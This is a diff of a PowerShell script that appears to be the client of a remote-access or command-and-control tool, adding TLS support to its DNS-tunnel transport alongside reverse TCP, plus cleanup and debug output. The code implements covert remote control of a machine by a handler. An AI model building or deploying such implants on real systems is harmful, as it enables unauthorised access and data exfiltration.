@@ -106,19 +106,27 @@ function Command-SendFile([UInt16] $downloadchannelid, [string] $filename, [PSOb
 function ReceiveHeader-Async-Start([PSObject] $transport) {
 
     $script = {
-        param([UInt32]$messageheaderlen, [PSObject]$transport, [string]$connectionmethod, [string]$channelencryption)
+        param([UInt32]$messageheaderlen, [PSObject]$transport, [PSObject]$initialtransport, [string]$connectionmethod, [string]$channelencryption)
 
         # This is a copy of the Transport-Tls-Receive / Transport-ReverseTcp-Receive function
         # with some special case handling for DNS
         $numb = 0
 	    $buffer = New-Object byte[]($messageheaderlen)
 	    while ($numb -lt $messageheaderlen) {
-	        if (($channelencryption -eq "TLS") -or ($connectionmethod -eq "REVERSETCP")) {
+	        if ($connectionmethod -eq "REVERSETCP") {
 		        $numb += $transport.reader.Read($buffer, $numb, $messageheaderlen-$numb)
-		    } elseif (($channelencryption -eq "NONE") -and ($connectionmethod -eq "DNS")) {
-		        $numb += $transport.stream.ReadSync($buffer, $numb, $messageheaderlen-$numb)
+		    } elseif ($connectionmethod -eq "DNS") {
+		        while (!($initialtransport.stream.HasData())) {}
+		        if ($channelencryption -eq "NONE") {
+		            $numb += $transport.stream.Read($buffer, $numb, $messageheaderlen-$numb)
+		        } elseif ($channelencryption -eq "TLS") {
+		            $numb += $transport.reader.Read($buffer, $numb, $messageheaderlen-$numb)
+		        } else {
+		            # ERROR with invalid $channelencryption for DNS
+		            return $NULL
+		        }
 		    } else {
-		        # ERROR with invalid $channelencryption and/or $connectionmethod
+		        # ERROR with invalid $connectionmethod
 		        return $NULL
 		    }
 	    }
@@ -127,7 +135,7 @@ function ReceiveHeader-Async-Start([PSObject] $transport) {
     }
 
     $p = [PowerShell]::Create()
-    $null = $p.AddScript($script).AddArgument($MESSAGE_HEADER_LEN).AddArgument($transport).AddArgument($CONNECTIONMETHOD).AddArgument($CHANNELENCRYPTION)
+    $null = $p.AddScript($script).AddArgument($MESSAGE_HEADER_LEN).AddArgument($transport).AddArgument($initialtransport).AddArgument($CONNECTIONMETHOD).AddArgument($CHANNELENCRYPTION)
     $job = $p.BeginInvoke()
     Write-Host "DEBUG: started background receive header process"
 
@@ -152,7 +160,9 @@ function ReceiveHeader-Async-IsDone([PSObject] $asyncobj) {
 function ReceiveHeader-Async-GetResult([PSObject] $asyncobj) {
 
     Write-Host "DEBUG: ended background receive header process"
-    return $asyncobj.shell.EndInvoke($asyncobj.job)
+    $res = $asyncobj.shell.EndInvoke($asyncobj.job)
+    $asyncobj.shell.Dispose()
+    return $res
 
 }
 
@@ -199,6 +209,9 @@ if ($CHANNELENCRYPTION -eq "NONE") {
     Exit(1)
 }
 
+
+try {
+
 Channel-setOpen $Channels[$MESSAGE_CHANNEL_COMMAND]
 
 # show hello message from handler
@@ -224,6 +237,11 @@ while (Channel-isOpen $Channels[$MESSAGE_CHANNEL_COMMAND]) {
     while ( ReceiveHeader-Async-IsDone $asyncobj ) {
         # receive result of the async job
         $messageheaders = ReceiveHeader-Async-GetResult $asyncobj
+        Write-Host "DEBUG: messageheaders =" $messageheaders
+        if ($CONNECTIONMETHOD -eq "DNS") {
+            Write-Host "DEBUG: next request-number =" $initialtransport.requestid
+        }
+
 
         # receive full message object and handle it
         $msg = Message-ParseFromTransport $transport $messageheaders
@@ -266,15 +284,18 @@ while (Channel-isOpen $Channels[$MESSAGE_CHANNEL_COMMAND]) {
     }
 
     # if we must poll, always send at least one package
-    if ((!$hassended) -and ($CHANNELENCRYPTION -eq "NONE") -and ($CONNECTIONMETHOD -eq "DNS")) {
+    if ((!$hassended) -and ($CONNECTIONMETHOD -eq "DNS")) {
         Write-Host "DEBUG: sending a polling NODATA message to handler"
         $initialtransport.stream.Write($NULL, 0, 0);
     }
 
 }
 
+
+} finally {
+
 # TODO: stop all jobs! TEST!
-$asyncobj.shell.Stop()
+$asyncobj.shell.Dispose()
 
 
 if ($CHANNELENCRYPTION -eq "TLS") {
@@ -285,4 +306,6 @@ if ($CONNECTIONMETHOD -eq "REVERSETCP") {
     Transport-ReverseTcp-Close $initialtransport
 } elseif ($CONNECTIONMETHOD -eq "DNS") {
     Transport-Dns-Close $initialtransport
+}
+
 }
